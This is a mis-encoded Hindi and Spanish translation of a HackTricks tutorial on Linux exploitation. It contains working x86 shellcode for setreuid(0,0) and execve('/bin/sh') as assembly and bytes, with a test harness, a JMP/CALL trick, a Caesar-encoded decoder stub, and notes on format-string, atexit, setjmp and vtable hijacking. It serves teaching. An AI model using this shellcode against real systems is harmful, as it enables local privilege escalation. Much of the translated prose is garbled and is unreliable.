# рд▓рд┐рдирдХреНрд╕ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯрд┐рдВрдЧ (рдореВрд▓) (SPA)

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рджреНрд╡рд╛рд░рд╛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

## **2.SHELLCODE**

Ver interrupciones de kernel: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep тАЬ\_\_NR\_тАЭ

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(тАЬ/bin/shтАЭ, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; limpiamos eax\
xor ebx, ebx ; ebx = 0 pues no hay argumento que pasar\
mov al, 0x01 ; eax = 1 тАФ> \_\_NR\_exit 1\
int 0x80 ; Ejecutar syscall

**nasm -f elf assembly.asm** тАФ> рд╣рдореЗрдВ рдПрдХ .o рдлрд╝рд╛рдЗрд▓ рджреЗрддрд╛ рд╣реИ\
**ld assembly.o -o shellcodeout** тАФ> рд╣рдореЗрдВ рдПрдХ рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓ рджреЗрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдЕрд╕реЗрдореНрдмрд▓реА рдХреЛрдб рд╣реЛрддрд╛ рд╣реИ рдФрд░ рд╣рдо рдСрдкрдХреЛрдбреНрд╕ рдХреЛ **objdump** рдХреЗ рд╕рд╛рде рдирд┐рдХрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ\
**objdump -d -Mintel ./shellcodeout** тАФ> рдпрд╣ рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рдпрд╣ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рд╣рдорд╛рд░реА рд╢реЗрд▓рдХреЛрдб рд╣реИ рдФрд░ рдСрдкрдХреЛрдбреНрд╕ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП

**рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рд╢реЗрд▓рдХреЛрдб рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ**
```
char shellcode[] = тАЬ\x31\xc0\x31\xdb\xb0\x01\xcd\x80тАЭ

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">тАЛ</span>
```
рдпрд╣ рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рд╣реЛ рд░рд╣реЗ рд╣реИрдВ, рдкрд┐рдЫрд▓реЗ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЛ рдХрдВрдкрд╛рдЗрд▓ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рдФрд░ рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓ **strace ./рдХрдВрдкрд╛рдЗрд▓ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдкреНрд░реЛрдЧреНрд░рд╛рдо** рдореЗрдВ рджрд┐рдЦрдирд╛ рдЪрд╛рд╣рд┐рдПред

рд╢реИрд▓рдХреЛрдб рдмрдирд╛рдиреЗ рдХреЗ рд╕рдордп рдПрдХ рдЪрд╛рд▓ рд▓рд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдкрд╣рд▓рд╛ рдирд┐рд░реНрджреЗрд╢ рдПрдХ рдХреЙрд▓ рдХреЛ рдЬрдореНрдк рдХрд░рдирд╛ рд╣реИред рдХреЙрд▓ рдореВрд▓ рдХреЛрдб рдХреЛ рдмреБрд▓рд╛рддрд╛ рд╣реИ рдФрд░ рд╕рд╛рде рд╣реА EIP рдХреЛ рд╕реНрдЯреИрдХ рдореЗрдВ рдбрд╛рд▓рддрд╛ рд╣реИред рдХреЙрд▓ рдХреЗ рдирд┐рд░реНрджреЗрд╢ рдХреЗ рдмрд╛рдж, рд╣рдордиреЗ рдЙрд╕ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ рдбрд╛рд▓ рджрд┐рдпрд╛ рд╣реИ рдЬрд┐рд╕рдХреА рд╣рдореЗрдВ рдЖрд╡рд╢реНрдпрдХрддрд╛ рдереА, рдЗрд╕рд▓рд┐рдП рдЙрд╕ EIP рдХреЗ рд╕рд╛рде рд╣рдо рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ рдирд┐рд╢рд╛рдирд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╕рд╛рде рд╣реА рдХреЛрдб рдХреЛ рдЬрд╛рд░реА рд░рдЦ рд╕рдХрддреЗ рд╣реИрдВред

рдЙрджрд╛рд╣рд░рдг **рдЪрд╛рд▓ (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al ├║ltimo call
popl                %esi                                       ; Guardamos en ese la direcci├│n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=тАЬ/bin/shтАЭ
leal                 0x8(%esi), %ecx      ; arg[2] = {тАЬ/bin/shтАЭ, тАЬ0тАЭ}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(тАЬ/bin/shтАЭ, [тАЬ/bin/shтАЭ, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci├│n
.string             \тАЭ/bin/sh\тАЭ                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">тАЛ</span>
```
**/bin/sh рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдИрдЬреЗ:**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; тАЬ\0тАЭ
push               dword 0x68732f2f ; тАЬ//shтАЭ
push               dword 0x6e69622f; тАЬ/binтАЭ
mov                ebx, esp                     ; arg1 = тАЬ/bin//sh\0тАЭ
push               eax                             ; Null -> args[1]
push               ebx                             ; тАЬ/bin/sh\0тАЭ -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(тАЬ/bin/shтАЭ, args[тАЬ/bin/shтАЭ, тАЬNULLтАЭ], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut├│ fabs
тАж
```
**рдЕрдВрдбрд╛ рд╣рдВрдЯрд░:**

рдпрд╣ рдПрдХ рдЫреЛрдЯрд╛ рд╕рд╛ рдХреЛрдб рд╣реИ рдЬреЛ рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╕реЗ рдЬреБрдбрд╝реА рдореЗрдореЛрд░реА рдкреЗрдЬреЛрдВ рдХреЛ рджреМрдбрд╝рддрд╛ рд╣реИ рдФрд░ рд╡рд╣рд╛рдБ рд╕рдВрдЧреНрд░рд╣рд┐рдд рд╢реЗрд▓рдХреЛрдб рдХреА рдЦреЛрдЬ рдХрд░рддрд╛ рд╣реИ (рд╢реЗрд▓рдХреЛрдб рдореЗрдВ рдбрд╛рд▓реА рдЧрдИ рдХреЛрдИ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдЦреЛрдЬрддрд╛ рд╣реИ)ред рдХреЛрдб рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЗрд╡рд▓ рдПрдХ рдЫреЛрдЯреЗ рд╕реНрдерд╛рди рдХреЗ рдорд╛рдорд▓реЛрдВ рдореЗрдВ рдЙрдкрдпреБрдХреНрддред

**рдкреЙрд▓рд┐рдореЙрд░реНрдлрд┐рдХ рд╢реЗрд▓рдХреЛрдб**

рдпреЗ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рд╢реЗрд▓реНрд╕ рд╣реИрдВ рдЬрд┐рдирдореЗрдВ рдПрдХ рдЫреЛрдЯрд╛ рдХреЛрдб рд╣реЛрддрд╛ рд╣реИ рдЬреЛ рдЙрдиреНрд╣реЗрдВ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЙрд╕ рдкрд░ рдЬрд╛рддрд╛ рд╣реИ, Call-Pop рдЯреНрд░рд┐рдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП рдпрд╣ рдПрдХ **рд╕реАрдЬрд╝рд░ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдЙрджрд╛рд╣рд░рдг** рд╣реЛрдЧрд╛:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer├б)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aqu├н va el shellcode
```
## **5. рдЕрддрд┐рд░рд┐рдХреНрдд рддрдХрдиреАрдХреЗрдВ**





**рдореБрд░рд╛рдЯ рддрдХрдиреАрдХ**

рд▓рд┐рдирдХреНрд╕ рдореЗрдВ рд╕рднреА рдкреНрд░реЛрдЧреНрд░рд╛рдо 0xbfffffff рд╕реЗ рдореИрдк рд╣реЛрддреЗ рд╣реИрдВред

рд▓рд┐рдирдХреНрд╕ рдореЗрдВ рдПрдХ рдирдП рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд╕реНрдЯреИрдХ рдХреЛ рдХреИрд╕реЗ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рджреЗрдЦрдХрд░, рдПрдХ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рд╡рд┐рдХрд╕рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдПрдХ рд╡рд╛рддрд╛рдиреБрдХреНрд░рдорд┐рдХ рдорд╛рддреНрд░рд╛ рдХреЗ рд╡рд╛рддрд╛рдиреБрдХреНрд░рдорд┐рдХ рдореЗрдВ рдЖрд░рдВрдн рдХрд┐рдпрд╛ рдЬрд╛рдПред рдЗрд╕рдХрд╛ рдкрддрд╛ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рд▓рдЧрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ: addr = 0xbfffffff - 4 - strlen(NOMBRE\_ejecutable\_completo) - strlen(shellcode)

рдЗрд╕ рддрд░рд╣ рд╕реЗ, рд╢реЗрд▓рдХреЛрдб рдХреЗ рд╕рд╛рде рд╡рд╛рддрд╛рдиреБрдХреНрд░рдорд┐рдХ рдореЗрдВ рдЪрд░ рдХреА рд╕реНрдерд┐рддрд┐ рдХреЛ рдЖрд╕рд╛рдиреА рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИред

рдпрд╣ рдХрд╛рд░рдг рд╣реИ рдХрд┐ execle рдлрд╝рдВрдХреНрд╢рди рдПрдХ рд╡рд╛рддрд╛рдиреБрдХреНрд░рдорд┐рдХ рдмрдирд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдХреЗрд╡рд▓ рд╡реЗ рд╡рд╛рддрд╛рдиреБрдХреНрд░рдорд┐рдХ рдЪрд╛рд╣рд┐рдП рдЬреЛ рдЪрд╛рд╣рд┐рдПред

##

###

###

###

###

### **рдлреЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧреНрд╕ рд╕реЗ рдмрдлрд░ рдУрд╡рд░рдлреНрд▓реЛ**

**sprintf** рдПрдХ рдлреЙрд░реНрдореЗрдЯреЗрдб рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ рдПрдХ рдЪрд░ рдореЗрдВ рд▓реЗ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП, рдЖрдк рдПрдХ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЗ рдлреЙрд░реНрдореЗрдЯрд┐рдВрдЧ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрд╕ рдЪрд░ рдореЗрдВ рдмрдлрд░ рдУрд╡рд░рдлреНрд▓реЛ рдХрд╛ рдХрд╛рд░рдг рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд╣рд╛рдВ рд╕рд╛рдордЧреНрд░реА рдХреЙрдкреА рдХреА рдЬрд╛рддреА рд╣реИред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдкреЗрд▓реЛрдб `%.44xAAAA` рдЪрд░ рдореЗрдВ 44B+"AAAA" рд▓рд┐рдЦреЗрдЧрд╛, рдЬреЛ рдПрдХ рдмрдлрд░ рдУрд╡рд░рдлреНрд▓реЛ рдХрд╛ рдХрд╛рд░рдг рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИред

### **\_\_atexit рд╕рдВрд░рдЪрдирд╛рдПрдБ**

{% hint style="danger" %}
рдЖрдЬрдХрд▓ рдЗрд╕реЗ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрд░рдирд╛ рдмрд╣реБрдд рдЕрдЬреАрдм рд╣реИред
{% endhint %}

**`atexit()`** рдПрдХ рдлрд╝рдВрдХреНрд╢рди рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдЕрдиреНрдп рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЛ рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпреЗ рдлрд╝рдВрдХреНрд╢рди рдПрдХ **`exit()`** рдпрд╛ **рдореБрдЦреНрдп** рдХреЗ **рд╡рд╛рдкрд╕реА** рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВрдЧреЗред

рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА рднреА рдЗрди рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЗ рдкрддреЗ рдХреЛ рдПрдХ рд╢реЗрд▓рдХреЛрдб рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХрд╛ рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВрдЧреЗ, рд▓реЗрдХрд┐рди рдпрд╣ рд╡рд░реНрддрдорд╛рди рдореЗрдВ рдЕрдзрд┐рдХ рдЬрдЯрд┐рд▓ рд╣реИред

рд╡рд░реНрддрдорд╛рди рдореЗрдВ рдирд┐рд╖реНрдХреНрд░рд┐рдп рдХрд┐рдП рдЧрдП рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЗ рдкрддреЗ рдХрдИ рд╕рдВрд░рдЪрдирд╛рдУрдВ рдХреЗ рдкреАрдЫреЗ рдЫрд┐рдкреЗ рд╣реЛрддреЗ рд╣реИрдВ рдФрд░ рдЕрдВрдд рдореЗрдВ рдЬрд┐рди рдкрддреЛрдВ рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рд╡реЗ рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЗ рдкрддреЛрдВ рдирд╣реАрдВ рд╣реЛрддреЗ рд╣реИрдВ, рдмрд▓реНрдХрд┐ **XOR** рдФрд░ рдПрдХ **рд░реИрдВрдбрдо рдХреБрдВрдЬреА** рдХреЗ рд╕рд╛рде **рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб** рд╣реЛрддреЗ рд╣реИрдВред рдЗрд╕рд▓рд┐рдП рд╡рд░реНрддрдорд╛рди рдореЗрдВ рдпрд╣ рд╣рдорд▓рд╛ рд╡реЗрдХреНрдЯрд░ рдХрдо рдЙрдкрдпреЛрдЧреА рд╣реИ рдХрдо рд╕реЗ рдХрдо x86 рдФрд░ x64\_86 рдкрд░ред

**рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдлрд╝рдВрдХреНрд╢рди** **`PTR_MANGLE`** рд╣реИред **рдЕрдиреНрдп рдЖрд░реНрдХрд┐рдЯреЗрдХреНрдЪрд░** рдЬреИрд╕реЗ m68k, mips32, mips64, aarch64, arm, hppa... **рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди** рдлрд╝рдВрдХреНрд╢рди рдХреЛ **рдирд╣реАрдВ рд▓рд╛рдЧреВ** рдХрд░рддреЗ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдЙрд╕реЗ рдЬреЛ рднреА рдЗрдирдкреБрдЯ рдорд┐рд▓рд╛ рд╡рд╣реА рд╡рд╛рдкрд╕ рдХрд░рддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП рдЗрди рдЖрд░реНрдХрд┐рдЯреЗрдХреНрдЪрд░реНрд╕ рдкрд░ рдпрд╣ рд╡реЗрдХреНрдЯрд░ рдкрд░ рд╣рдорд▓рд╛ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

### **setjmp() & longjmp()**

{% hint style="danger" %}
рдЖрдЬрдХрд▓ рдЗрд╕реЗ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрд░рдирд╛ рдмрд╣реБрдд рдЕрдЬреАрдм рд╣реИред
{% endhint %}

**`Setjmp()`** рдХреЛ **рд╕рдВрджрд░реНрдн** (рд░рдЬрд┐рд╕реНрдЯрд░) рдХреЛ **рдмрдЪрд╛рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред\
**`longjmp()`** рдХреЛ **рд╕рдВрджрд░реНрдн** (рд░рдЬрд┐рд╕реНрдЯрд░) рдХреЛ **рдкреБрдирд░реНрд╕реНрдерд╛рдкрд┐рдд** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

**рдмрдЪрд╛рдП рдЧрдП рд░рдЬрд┐рд╕реНрдЯрд░** рд╣реИрдВ: `EBX, ESI, EDI, ESP, EIP, EBP`\
рдпрд╣ рд╣реИ рдХрд┐ EIP рдФрд░ ESP **`PTR_MANGLE`** рдлрд╝рдВрдХреНрд╢рди рджреНрд╡рд╛рд░рд╛ рдкрд╛рд░рд┐рдд рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП **рдЗрд╕ рд╣рдорд▓реЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рдХрд▓реНрдкрд╢реАрд▓ рдЖрд░реНрдХрд┐рдЯреЗрдХреНрдЪрд░ рдЙрдкрд░реЛрдХреНрдд рд╣реИрдВ**ред

рдпреЗ рддреНрд░реБрдЯрд┐ рд╕реБрдзрд╛рд░ рдпрд╛ рдЕрдВрддрд░реНрд░реБрдкреНрддрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реИрдВред\
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЬрд┐рддрдирд╛ рдореИрдВрдиреЗ рдкрдврд╝рд╛ рд╣реИ, рдЕрдиреНрдп рд░рдЬрд┐рд╕реНрдЯрд░ рд╕реБрд░рдХреНрд╖рд┐рдд рдирд╣реАрдВ рд╣реИрдВ, **рддреЛ рдпрджрд┐ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рднреАрддрд░ `call ebx`, `call esi` рдпрд╛ `call edi`** рд╣реИ, рддреЛ рдирд┐рдпрдВрддреНрд░рдг рдкрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╛ рдЖрдк рдпрд╣ рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ EBP рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ ESP рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░реЗрдВред

**C++ рдореЗрдВ VTable рдФрд░ VPTR**

рдкреНрд░рддреНрдпреЗрдХ рдХреНрд▓рд╛рд╕ рдХреЗ рдкрд╛рд╕ рдПрдХ **Vtable** рд╣реЛрддреА рд╣реИ рдЬреЛ **рдореЗрдердбреНрд╕ рдХреЗ рдкреЙрдЗрдВрдЯрд░реНрд╕ рдХрд╛ рдПрдХ рдПрд░реЗ** рд╣реИред

рдкреНрд░рддреНрдпреЗрдХ рдХреНрд▓рд╛рд╕ рдХрд╛ рдПрдХ **VPtr** рд╣реЛрддрд╛ рд╣реИ рдЬреЛ рдЙрд╕рдХреА рдХреНрд▓рд╛рд╕ рдХреЗ рдПрд░реЗ рдХрд╛ **рдкреЙрдЗрдВрдЯрд░** рд╣реЛрддрд╛ рд╣реИред VPtr рдкреНрд░рддреНрдпреЗрдХ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЗ рд╣реЗрдбрд░ рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдпрджрд┐ **VPtr** рдХрд╛ **рдЕрдзрд┐рдХрд╛рд░** рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рдЙрд╕реЗ **рд╕рдВрд╢реЛрдзрд┐рдд** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдХрд┐рд╕реА рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдкрд░ рд╢реЗрд▓рдХреЛрдб рдореЗрдВ рдЬрд╛рдПред

## **рд░реЛрдХрдерд╛рдо рдФрд░ рдЯрд╛рд▓рдиреЗ рдХреЗ рдЙрдкрд╛рдп**

###

**рд▓рд┐рдмрд╕реЗрдл рдХреА рдЬрдЧрд╣**

рдЗрд╕реЗ рд╕рдХреНрд░рд┐рдп рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ: LD\_PRELOAD=/lib/libsafe.so.2\
рдпрд╛\
тАЬ/lib/libsave.so.2тАЭ > /etc/ld.so.preload

рдХреБрдЫ рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЛ рдХреБрдЫ рд╕реБрд░рдХреНрд╖рд┐рдд рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рд╕реЗ рдЕрдВрддрд░реНрдЧрдд рдХрд░ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рдорд╛рдирдХреАрдХреГрдд рдирд╣реАрдВ рд╣реИред (рдХреЗрд╡рд▓ x86 рдХреЗ рд▓рд┐рдП, -fomit-frame-pointer рдХреЗ рд╕рд╛рде рдирд╣реАрдВ, рд╕реНрдереИрддрд┐рдХ рдХрдВрдкрд╛рдЗрд▓реЗрд╢рди рдХреЗ рд╕рд╛рде рдирд╣реАрдВ, рд╕рднреА рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рдлрд╝рдВрдХреНрд╢рди рд╕реБрд░рдХреНрд╖рд┐рдд рдирд╣реАрдВ рдмрдирддреЗ рд╣реИрдВ рдФрд░ LD\_PRELOAD рд╕реБрдЗрдб рд╡рд╛рд▓реЗ рдмрд╛рдЗрдирд░реА рдореЗрдВ рдХрд╛рдо рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ)ред

**рдПрдПрд╕рд╕реАрдЖрдИ рдЖрд░реНрдорд░реНрдб рдПрдбреНрд░реЗрд╕ рд╕реНрдкреЗрд╕**

рдпрд╣ 0x00000000 рд╕реЗ 0x00ffffff рддрдХ рд╕рд╛рдЭрд╛ рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдХрд╛рд░рдг рд╣реИ рддрд╛рдХрд┐ рд╣рдореЗрд╢рд╛ рдПрдХ 0x00 рдмрд╛рдЗрдЯ рд╣реЛред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрд╣ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдХрд┐рд╕реА рднреА рд╣рдорд▓реЗ рдХреЛ рдореБрдЦреНрдп рд░реВрдк рд╕реЗ рдирд╣реАрдВ рд░реЛрдХрддрд╛, рдФрд░ рдХрдо рд▓рд┐рдЯрд┐рд▓ рдЗрдВрдбрд┐рдпрди рдореЗрдВред

**ret2plt**

рдЗрд╕рдореЗрдВ рдПрдХ ROP рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ plt рдХреА strcpy@plt рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рдП рдФрд░ GOT рдХреЗ рдкреНрд░рд╡реЗрд╢ рдкрд░ рдЗрд╢рд╛рд░рд╛ рдХрд┐рдпрд╛ рдЬрд╛рдП рдФрд░ рд╡рд╣рд╛рдВ рд╕реЗ рдЬрд┐рд╕ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдмреБрд▓рд╛рдирд╛ рдЪрд╛рд╣рд┐рдП (system()) рдХрд╛ рдкрд╣рд▓рд╛ рдмрд╛рдЗрдЯ рдХреЙрдкреА рдХрд┐рдпрд╛ рдЬрд╛рдПред рдЗрд╕рдХреЗ рдмрд╛рдж рдпрд╣реА рдХрд╛рд░реНрдп рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ GOT+1 рдкрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░рдХреЗ рдФрд░ system() рдХрд╛ 2рд╡рд╛рдВ рдмрд╛рдЗрдЯ рдХреЙрдкреА рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ... рдЕрдВрдд рдореЗрдВ GOT рдореЗрдВ 